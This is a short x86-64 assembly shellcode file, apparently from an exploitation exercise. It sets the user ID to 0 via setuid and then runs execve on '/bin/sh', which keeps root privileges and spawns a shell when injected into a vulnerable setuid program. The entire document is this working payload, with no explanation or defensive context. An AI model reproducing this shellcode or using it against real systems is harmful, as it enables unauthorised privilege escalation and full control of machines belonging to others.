.global _start
_start:
.intel_syntax noprefix
            xor rdi, rdi           
            mov rax, 105          
            syscall                

            mov rax, 59
            lea rdi, [rip+binsh]
            mov rsi, 0
            mov rdx, 0
            syscall
binsh:
            .string "/bin/sh"
